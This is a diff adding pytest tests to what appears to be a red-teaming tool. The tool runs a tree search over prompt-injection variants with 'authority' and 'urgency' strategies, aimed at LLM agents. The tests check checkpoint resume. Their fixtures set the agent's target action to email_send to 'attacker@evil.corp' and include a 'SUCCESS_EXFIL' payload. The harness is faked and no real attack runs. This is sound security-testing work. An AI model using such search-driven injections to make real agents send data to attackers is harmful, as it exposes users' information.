@@ -309,3 +309,93 @@ class TestTAPTCAttackerIntegration:
         assert len(success_traces) >= 1
         # Harness should only have been called once (early termination)
         assert harness.call_count == 1
+
+    def test_resume_from_checkpoint_continues_from_depth(self, monkeypatch, tmp_path):
+        """Resuming a checkpoint at depth 2 with depth_remaining=1 only executes depth 3."""
+        harness = FakeHarness()
+        recorded_depths: list[int] = []
+
+        def fake_generate_with_depth(self_gen, seed_payload, target_tool, target_args, depth=0, **kwargs):
+            recorded_depths.append(depth)
+            return [{"location": "e", "content": f"depth_{depth}", "_strategy": "authority"}]
+
+        from attacks.tap_tc import generator as gen_module
+        monkeypatch.setattr(gen_module.VariantGenerator, "generate", fake_generate_with_depth)
+
+        mgr = CheckpointManager(directory=tmp_path)
+        # Pre-seed a checkpoint at depth 2 with 1 live node
+        node = TreeNode(
+            node_id="test_node_d2",
+            depth=2,
+            payload={"location": "e", "content": "d2_payload"},
+            strategy="authority",
+            score=0.75,
+        )
+        pre_state = CheckpointState(
+            root_payload={"location": "e", "content": "root"},
+            target_tool="email_send",
+            target_args={"to": "attacker@evil.corp"},
+            task_id="task_0",
+            depth_reached=2,
+            budget_consumed=10,
+            live_nodes=[node],
+            all_nodes=[node],
+        )
+        mgr.save(pre_state, "warm_start_ckpt")
+
+        attacker = TAPTCAttacker(
+            harness=harness,
+            checkpoint_name="warm_start_ckpt",
+            checkpoint_manager=mgr,
+        )
+
+        traces = attacker.resume("warm_start_ckpt", depth_remaining=1)
+        assert len(traces) == 1
+        # Generator should only have been called for depth 3
+        assert recorded_depths == [3]
+
+        # Checkpoint on disk should now record depth_reached = 3
+        updated_state = mgr.load("warm_start_ckpt")
+        assert updated_state.depth_reached == 3
+        assert len(updated_state.all_nodes) >= 2
+
+    def test_resume_warm_start_success(self, monkeypatch, tmp_path):
+        """Warm start checkpoint finds success at resumed depth."""
+        harness = FakeHarness()
+
+        def fake_generate_success(self_gen, seed_payload, **kwargs):
+            return [{"location": "e", "content": "SUCCESS_EXFIL", "_strategy": "urgency"}]
+
+        from attacks.tap_tc import generator as gen_module
+        monkeypatch.setattr(gen_module.VariantGenerator, "generate", fake_generate_success)
+
+        mgr = CheckpointManager(directory=tmp_path)
+        node = TreeNode(
+            node_id="n_prev",
+            depth=3,
+            payload={"location": "e", "content": "d3"},
+            strategy="urgency",
+            score=0.75,
+        )
+        pre_state = CheckpointState(
+            root_payload={"location": "e", "content": "root"},
+            target_tool="email_send",
+            target_args={"to": "attacker@evil.corp"},
+            task_id="task_0",
+            depth_reached=3,
+            budget_consumed=15,
+            live_nodes=[node],
+            all_nodes=[node],
+        )
+        mgr.save(pre_state, "workspace_exfil_test")
+
+        attacker = TAPTCAttacker(
+            harness=harness,
+            checkpoint_name="workspace_exfil_test",
+            checkpoint_manager=mgr,
+        )
+
+        traces = attacker.resume("workspace_exfil_test", depth_remaining=1)
+        assert len(traces) == 1
+        assert traces[0].outcome.succeeded is True
+        assert traces[0].outcome.partial_score == 1.0
